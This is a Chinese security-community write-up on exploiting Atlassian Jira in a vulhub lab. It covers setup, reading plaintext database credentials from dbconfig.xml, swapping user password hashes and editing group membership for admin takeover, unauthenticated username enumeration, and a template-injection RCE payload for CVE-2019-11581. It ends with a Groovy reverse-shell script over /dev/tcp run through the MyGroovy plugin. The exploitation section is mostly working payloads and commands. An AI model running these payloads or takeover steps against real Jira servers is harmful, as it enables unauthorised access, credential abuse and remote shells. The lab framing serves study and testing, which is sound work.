<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/11491)

> 先知社区，先知安全技术社区

Author：əhead@深蓝攻防实验室

#### 前言

Atlassian Jira 是一套作为缺陷跟踪管理的系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理，后来慢慢发展为多任务的项目管理软件。

本次主要记录从搭建到利用的过程，就没展开对漏洞的具体分析了。如果有出错的地方，请各位师傅多多指教，仅供参考。

##### 一、环境搭建

1. 这里选择在 kali 作为本次的实验环境，配置更新源按如下命令安装 docker 及 docker-compose 即可。

```
curl -fsSL http://mirrors.zju.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -
echo 'deb http://mirrors.zju.edu.cn/docker-ce/linux/debian/ buster stable' | sudo tee /etc/apt/sources.list.d/docker.list

sudo apt-get update

sudo apt-get install docker-ce

sudo apt install docker-compose
```

2. 这里为了方便省时间，我们可以利用 vulhub 靶场去启用 jira 的漏洞环境  
拉取 vulhub

```
git clone https://github.com/vulhub/vulhub.git
```

部署并启动 jira 环境

```
cd /vulhub/jira/CVE-2019-11581 && docker-compose up -d
```

开启 mysql 服务，并进行初始安全配置

```
service mysql start && mysql_secure_installation
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617104151-0a9d1d68-ede7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617104151-0a9d1d68-ede7-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617104305-36ef86b2-ede7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617104305-36ef86b2-ede7-1.png)  
修改配置文件允许 mysql 远程访问，并设置 root 用户远程访问

```
vi /etc/mysql/mariadb.conf.d/50-server.cnf  

GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '123456' WITH GRANT OPTION;
flush privileges;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617104439-6ead6ec0-ede7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617104439-6ead6ec0-ede7-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617104455-783ca302-ede7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617104455-783ca302-ede7-1.png)  
创建数据库名为 jira 并尝试连接，如下

```
create database jira default character set utf8 collate utf8_general_ci;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617104552-9a27c460-ede7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617104552-9a27c460-ede7-1.png)  
3. 如果在 jira 部署配置数据库连接时报错 Could not find driver with class name: com.mysql.jdbc.Driver，这是因为 mysql 驱动的问题，下载并将驱动拷进 lib 目录下即可  
下载 mysql 驱动，地址如下：

```
https://downloads.mysql.com/archives/get/p/3/file/mysql-connector-java-5.1.49.tar.gz
```

解压并将以 bin.jar 结尾的文件 copy 进容器内，如下:

```
docker cp /home/kali/Desktop/mysql-connector-java-5.1.49/mysql-connector-java-5.1.49-bin.jar 容器id:/opt/atlassian/jira/lib
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617104928-1b23c050-ede8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617104928-1b23c050-ede8-1.png)  
4. 接着可以看到配置 mysql 并测试连接，显示如下表示成功

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617105000-2e2773fe-ede8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617105000-2e2773fe-ede8-1.png)  
5. 下一步需在 jira 官网注册一个账号，然后利用账号申请一个可以试用 30 天的 license，最终完成所有配置，进入系统

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617110200-db1691ca-ede9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617110200-db1691ca-ede9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617111646-eb9ec43e-edeb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617111646-eb9ec43e-edeb-1.png)

##### 二、配置文件及数据库表结构（mysql）

jira 的数据库配置文件为 dbconfig.xml，可以通过如下路径获取到所使用的数据库明文账号及密码

```
cat /var/atlassian/application-data/jira/dbconfig.xml
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617111752-1291b628-edec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617111752-1291b628-edec-1.png)  
export 作为数据备份目录，通过如下路径获取备份文件等

```
ls /var/atlassian/application-data/jira/export
```

attachments 作为附件存储目录，通过如下路径获取上传的附件文件等

```
ls /var/atlassian/application-data/jira/data/attachments
```

###### 下面是数据库里部分表的存储字段

<table><thead><tr><th>表名</th><th>存储内容</th><th>关键字段</th></tr></thead><tbody><tr><td>project</td><td>项目主表</td><td>ID - 项目编号<br>pname - 项目名称<br>URL - 项目链接<br>LEAD<br>DESCRIPTION - 项目描述<br>pkey - 项目 key<br>pcounter<br>ASSIGNEETYPE<br>AVATAR<br>ORIGINALKEY<br>PROJECTTYPE - 项目类型</td></tr><tr><td>project_key</td><td>项目 key 表</td><td>ID - 项目编号<br>PROJECT_ID - 项目 id<br>PROJECT_KEY - 项目 key</td></tr><tr><td>projectrole</td><td>项目角色</td><td>ID<br>NAME<br>DESCRIPTION</td></tr><tr><td>projectroleactor</td><td>项目角色关联关系</td><td>ID<br>PID<br>PROJECTROLEID - 项目角色 id<br>ROLETYPE - 角色类型<br>ROLETYPEPARAMETER - 具体用户或用户组</td></tr><tr><td>jiraissue</td><td>JIRA 的 issue</td><td>ID<br>pkey<br>issuenum - 和 project 表 pkey 字段组合成 issue key<br>PROJECT - 关联 project 表 ID<br>REPORTER - 报告人<br>ASSIGNEE - 经办人<br>CREATOR - 创建人<br>issuetype - 关联 issuetype 表 ID<br>SUMMARY - 标题<br>DESCRIPTION - 描述<br>ENVIRONMENT<br>PRIORITY - 关联 priority 表 ID<br>RESOLUTION - 关联 resolution 表 ID<br>issuestatus<br>CREATED - 创建时间<br>UPDATED - 更新时间<br>DUEDATE<br>RESOLUTIONDATE - 解决时间<br>VOTES<br>WATCHES<br>TIMEORIGINALESTIMATE<br>TIMEESTIMATE<br>TIMESPENT<br>WORKFLOW_ID - 工作流 ID<br>SECURITY<br>FIXFOR<br>COMPONENT<br>ARCHIVED<br>ARCHIVEDBY<br>ARCHIVEDDATE</td></tr><tr><td>priority</td><td>issue 优先级</td><td>ID<br>SEQUENCE<br>pname - 优先级名称<br>DESCRIPTION<br>ICONURL<br>STATUS_COLOR</td></tr><tr><td>resolution</td><td>issue 解决结果</td><td>ID<br>SEQUENCE<br>pname - 解决结果名称<br>DESCRIPTION<br>ICONURL</td></tr><tr><td>component</td><td>模块表</td><td>ID<br>PROJECT<br>cname - 模块名称<br>description<br>URL<br>LEAD<br>ASSIGNEETYPE<br>ARCHIVED</td></tr><tr><td>jiraworkflows</td><td>JIRA 的工作流</td><td>ID<br>workflowname - 工作流名称<br>creatorname - 创建者<br>DESCRIPTOR<br>ISLOCKED - 锁定状态</td></tr><tr><td>cwd_user</td><td>用户表</td><td>ID<br>directory_id<br>user_name - 用户名<br>lower_user_name<br>active<br>created_date<br>updated_date<br>first_name<br>lower_first_name<br>last_name<br>lower_last_name<br>display_name<br>lower_display_name<br>email_address<br>lower_email_address<br>CREDENTIAL - 加密后的用户密码<br>deleted_externally<br>EXTERNAL_ID</td></tr><tr><td>cwd_membership</td><td>用户所属成员组表</td><td>ID<br>parent_id<br>child_id<br>membership_type<br>group_type<br>parent_name - 用户权限<br>lower_parent_name - 用户权限<br>child_name<br>lower_child_name<br>directory_id</td></tr></tbody></table>

通过表的存储字段分析，可以替换 cwd_user 表的 CREDENTIAL 字段密文登录指定用户（前提密文是以 {PKCS5S2} 开头的）

```
//对应密码为Ab123456
{PKCS5S2}ltrb9LlmZ0QDCJvktxd45WgYLOgPt2XTV8X7av2p0mhPvIwofs9bHYVz2OXQ6/kF

//对应密码为123456
{PKCS5S2}6pm6MWrrixyAFrSbs8oNL53TU3j3GIXRHIIIHtSdKJ8+JkqVrzD8rHjEVPU4CAIE

//更新密码的sql语句
update cwd_user set credential = '{PKCS5S2}ltrb9LlmZ0QDCJvktxd45WgYLOgPt2XTV8X7av2p0mhPvIwofs9bHYVz2OXQ6/kF' where user_;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113111-ef1fd5ec-eded-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113111-ef1fd5ec-eded-1.png)  
通过修改 cwd_membership 表的 parent_name 及 lower_parent_name 字段值为 jira-administrators，可将指定用户提升至管理员权限

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113137-fe4b9ae2-eded-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113137-fe4b9ae2-eded-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113155-091b2410-edee-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113155-091b2410-edee-1.png)  
查询指定项目的所有用户

```
SELECT p.id AS project_id, p.pname AS project_name, p.lead AS project_lead, prc.roletypeparameter AS project_roles
FROM project p LEFT OUTER JOIN projectroleactor prc ON prc.pid = p.id
WHERE p.pname = 'Test01';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113300-300538ae-edee-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113300-300538ae-edee-1.png)

##### 三、漏洞利用

1. 未授权进行用户名枚举  
枚举用户名接口

```
GET /rest/api/2/user/picker?query=zhangsan HTTP/1.1
Host: xx.xx.xx.xx:8080
Connection: close
```

用户名存在则返回如下信息

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113404-55f71b18-edee-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113404-55f71b18-edee-1.png)  
用户名不存在则返回如下信息

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113415-5c705d1a-edee-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113415-5c705d1a-edee-1.png)  
2.Atlassian Jira 模板注入 rce（前提：已开启联系管理员表单）

```
//访问该链接显示如下信息，则说明没有配置联系管理员，无法触发漏洞

无需管理员权限：http://xx.xx.xx.xx:8080/secure/ContactAdministrators!default.jspa
需要管理员权限：http://xx.xx.xx.xx:8080/secure/admin/SendBulkMail!default.jspa
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113458-764ec3d4-edee-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113458-764ec3d4-edee-1.png)

```
//访问该链接配置smtp
http://xx.xx.xx.xx:8080/secure/admin/VerifySmtpServerConnection!add.jspa
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113534-8ba06ec2-edee-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113534-8ba06ec2-edee-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617113550-951e518a-edee-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617113550-951e518a-edee-1.png)

```
//访问该链接开启联系管理员表单
http://xx.xx.xx.xx:8080/secure/admin/EditApplicationProperties!default.jspa
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617130329-d3be54ec-edfa-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617130329-d3be54ec-edfa-1.png)

```
//poc
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://xx.xx.xx.xx').waitFor()
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617130427-f6501630-edfa-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617130427-f6501630-edfa-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617130452-055e3ca6-edfb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617130452-055e3ca6-edfb-1.png)  
ps：进行反弹操作时，由于 Runtime.getRuntime().exec() 不能执行管道命令的问题，需要将 exec 内的命令进行 base64 编码，即可反弹会话，如下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617130526-19ce761a-edfb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617130526-19ce761a-edfb-1.png)  
3. 利用 MyGroovy 插件进行 getshell

```
//管理插件接口地址
http://xx.xx.xx.xx:8080/plugins/servlet/upm?source=side_nav_manage_addons
//查看jira对应版本接口地址
http://xx.xx.xx.xx:8080/secure/admin/ViewSystemInfo.jspa
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617130643-47dcac48-edfb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617130643-47dcac48-edfb-1.png)  
再根据对应的版本信息下载 MyGroovy 插件（tips：如果版本不对应会出现无法启用该插件的错误）  
地址：[https://marketplace.atlassian.com/apps/1218755/mygroovy/version-history](https://marketplace.atlassian.com/apps/1218755/mygroovy/version-history)  
这里按照对应版本下载兼容的 MyGroovy 插件，如下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617130736-66f92818-edfb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617130736-66f92818-edfb-1.png)  
接着在上传插件处添加 MyGroovy 插件，如下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617130759-751a1dda-edfb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617130759-751a1dda-edfb-1.png)  
安装成功后，进入 MyGroovy console 执行反弹脚本，如下

```
def r = Runtime.getRuntime()
def p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

等待片刻 即可收到 shell 会话，如下  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20220617130943-b2d32bb2-edfb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220617130943-b2d32bb2-edfb-1.png)